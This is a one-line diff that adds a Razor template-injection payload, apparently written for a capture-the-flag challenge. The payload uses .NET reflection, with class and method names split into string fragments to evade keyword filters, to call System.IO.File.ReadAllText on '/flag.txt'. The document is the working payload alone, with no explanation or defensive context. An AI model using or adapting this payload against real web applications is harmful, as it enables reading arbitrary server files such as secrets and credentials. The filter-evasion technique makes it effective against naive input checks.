@@ -1,0 +1,1 @@
+@( typeof(string).Assembly .GetType("System." + "IO." + "Fi" + "le") .GetMethod("Read" + "All" + "Text", new[]{typeof(string)}) .Invoke(null, new object[]{ "/flag.txt" }) )
